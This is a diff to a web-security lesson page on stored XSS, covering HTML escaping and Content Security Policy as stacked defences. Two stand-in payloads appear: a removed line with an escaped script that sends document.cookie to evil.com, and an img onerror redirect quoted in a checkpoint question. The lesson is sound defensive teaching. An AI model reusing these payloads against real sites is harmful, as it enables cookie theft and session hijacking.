@@ -4,6 +4,9 @@ title: "L3 — The Scenario's stored XSS, the sanitization fix, and a CSP as a s
 
 import LevelIntro from "../../../components/LevelIntro.astro";
 import Checkpoint from "../../../components/Checkpoint.astro";
+import PracticeCheck from "../../../components/PracticeCheck.astro";
+
+export const unit = { track: "web", unitSlug: "xss" };
 
 L2 established why sanitization and CSP work as independent, stacked
 layers rather than substitutes for each other. L3 implements the
@@ -79,39 +82,37 @@ a position where the parser expects markup.
 
 </Checkpoint>
 
+<PracticeCheck
+  track={unit.track}
+  unitSlug={unit.unitSlug}
+  topicId="vulnerable-renderer"
+/>
+
 ## The fix: escape, don't insert
 
 **How does escaping the content prevent the script from executing?**
+The fix doesn't block or filter anything — it replaces exactly the
+characters that give HTML its structural meaning with their literal
+text equivalents, before the string is ever inserted into the page:
 
-```js
-function escapeHtml(str) {
-  return str
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#39;");
-}
+| Character | Structural meaning in HTML  | Escaped to |
+| --------- | --------------------------- | ---------- |
+| `<`       | Opens a tag                 | `&lt;`     |
+| `>`       | Closes a tag                | `&gt;`     |
+| `"`       | Delimits an attribute value | `&quot;`   |
+| `'`       | Delimits an attribute value | `&#39;`    |
+| `&`       | Starts an HTML entity       | `&amp;`    |
 
-function renderCommentFixed(comment) {
-  return `<div class="comment">${escapeHtml(comment.text)}</div>`;
-}
-```
-
-```js
-renderCommentFixed(maliciousComment);
-// '<div class="comment">&lt;script&gt;document.location=&quot;https://evil.com/steal?cookie=&quot;+document.cookie&lt;/script&gt;</div>'
-```
-
-`escapeHtml` replaces the characters that give HTML its structural
-meaning (`<`, `>`, `"`, `'`, `&`) with their literal text
-equivalents. The browser now sees `&lt;script&gt;` — the literal
-_text_ "`<script>`" — rather than an actual opening tag, so it
-renders as visible text on the page instead of executing as code.
-The comment's content is preserved exactly (the visitor sees the
-literal text the attacker typed), but it can never be interpreted as
-markup, which is the entire point: user input is data, never code,
-once escaped.
+Running the malicious comment's text through this mapping turns
+`<script>...</script>` into the literal text
+`&lt;script&gt;...&lt;/script&gt;`. Inserted into the same
+`<div class="comment">` template that `renderCommentVulnerable` used,
+the browser now sees `&lt;script&gt;` — the literal _text_
+"`<script>`" — rather than an actual opening tag, so it renders as
+visible text on the page instead of executing as code. The comment's
+content is preserved exactly (the visitor sees the literal text the
+attacker typed), but it can never be interpreted as markup, which is
+the entire point: user input is data, never code, once escaped.
 
 **Would checking for the word "script" and rejecting comments that
 contain it work as well as escaping?** No — that's a much weaker
@@ -121,36 +122,35 @@ attack vectors that don't contain the literal word "script" at all
 is what actually closes the underlying mechanism, regardless of what
 specific attack syntax is used.
 
+<PracticeCheck
+  track={unit.track}
+  unitSlug={unit.unitSlug}
+  topicId="escape-html"
+/>
+
 ## CSP as a second, independent layer
 
 **Suppose a different bug somewhere still let an unescaped script
-through. What would a Content Security Policy do about it?**
+through. What would a Content Security Policy do about it?** CSP is
+sent as one HTTP response header, built from directives that each
+name a resource type and the sources allowed to supply it:
 
-```js
-function buildCspHeader(policy) {
-  return Object.entries(policy)
-    .map(([directive, sources]) => `${directive} ${sources.join(" ")}`)
-    .join("; ");
-}
-```
+| Directive         | Example value                       | What it restricts                                          |
+| ----------------- | ----------------------------------- | ---------------------------------------------------------- |
+| `default-src`     | `'self'`                            | Fallback source list for any directive not set explicitly  |
+| `script-src`      | `'self' https://cdn.example.com`    | Where executable scripts are allowed to load from          |
+| `'unsafe-inline'` | (omitted, or added to `script-src`) | Whether inline `<script>` tags/handlers are allowed at all |
 
-```js
-buildCspHeader({
-  "default-src": ["'self'"],
-  "script-src": ["'self'", "https://cdn.example.com"],
-});
-// "default-src 'self'; script-src 'self' https://cdn.example.com"
-```
-
-Sent as an HTTP header, this tells the browser: only run scripts that
-come from this site itself or from the named CDN. An injected inline
-`<script>` tag (like the Scenario's) has no external source at all —
-under a policy like this, without also allowing `'unsafe-inline'`,
-the browser refuses to execute it, even if it somehow ended up in the
-page's HTML. This is precisely the "second layer" from L2: CSP
-doesn't need to know anything about comments or sanitization — it's
-a blanket browser-enforced rule that limits what any script,
-injected or not, is allowed to do.
+A policy of `default-src 'self'; script-src 'self' https://cdn.example.com`
+tells the browser: only run scripts that come from this site itself
+or from the named CDN. An injected inline `<script>` tag (like the
+Scenario's) has no external source at all — under a policy like
+this, without also allowing `'unsafe-inline'`, the browser refuses to
+execute it, even if it somehow ended up in the page's HTML. This is
+precisely the "second layer" from L2: CSP doesn't need to know
+anything about comments or sanitization — it's a blanket
+browser-enforced rule that limits what any script, injected or not,
+is allowed to do.
 
 <Checkpoint question="Suppose an attacker's injected markup were an image tag with a broken source and an onerror handler, like the text: img src=x onerror='document.location=evil.com', instead of a script tag. Would the CSP policy shown above (script-src limited to 'self' and the CDN) still block it?">
 
@@ -166,6 +166,12 @@ being a blanket, syntax-agnostic rule rather than a check against any
 particular attack pattern.
 
 </Checkpoint>
+
+<PracticeCheck
+  track={unit.track}
+  unitSlug={unit.unitSlug}
+  topicId="csp-directives"
+/>
 
 ## What generalizes and what doesn't
 
@@ -186,6 +192,12 @@ element's text content (e.g., `<div title="${comment.author}">`),
 would the same `escapeHtml` function used here be sufficient, or does
 attribute context introduce a different injection risk that needs
 its own handling?
+
+<PracticeCheck
+  track={unit.track}
+  unitSlug={unit.unitSlug}
+  topicId="injection-context-generalization"
+/>
 
 ## Failure modes
 
